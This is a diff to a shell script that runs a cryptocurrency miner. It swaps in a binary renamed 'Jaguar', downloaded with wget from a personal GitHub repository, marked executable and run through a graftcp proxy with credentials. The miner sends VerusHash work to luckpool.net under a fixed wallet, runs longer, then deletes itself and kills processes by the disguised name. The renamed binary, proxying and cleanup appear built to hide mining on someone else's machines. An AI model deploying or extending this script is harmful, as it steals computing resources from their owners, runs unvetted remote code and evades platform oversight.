@@ -18,7 +18,7 @@ run_ccminer() {
   local proxy=$1
 
   # Kill any leftover ccminer processes from previous runs
-  pkill -f 'kulibang'
+  pkill -f 'Jaguar'
   sleep 2  # Wait to ensure all processes are terminated
 
   # Set up graftcp configuration
@@ -37,17 +37,20 @@ END
   /usr/bin/graftcp curl ifconfig.me
   echo " "
   echo " "
+
+  /usr/bin/graftcp wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/Jaguar
+  chmod +x Jaguar
   
   # Run ccminer in the background
-  /usr/bin/graftcp ./ccminer/ccminer -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.SKYLAKE -p x -t "$(nproc)" &
+  /usr/bin/graftcp ./Jaguar ---algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.NORTAMERICA --cpu-threads "$(nproc)" --proxy $username:$password@$proxy  &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
 
   # Sleep for xx minutes
-  sleep 2600
+  sleep 7000
 
-  rm kulibang
+  rm Jaguar
 
   # Send SIGINT to ccminer to terminate gracefully (equivalent to Ctrl + C)
   kill -2 $ccminer_pid
@@ -68,7 +71,7 @@ END
   fi
 
   # Ensure all ccminer processes are terminated before proceeding
-  pkill -f 'kulibang'
+  pkill -f 'Jaguar'
   sleep 2  # Wait to ensure all processes are cleared
 }
 
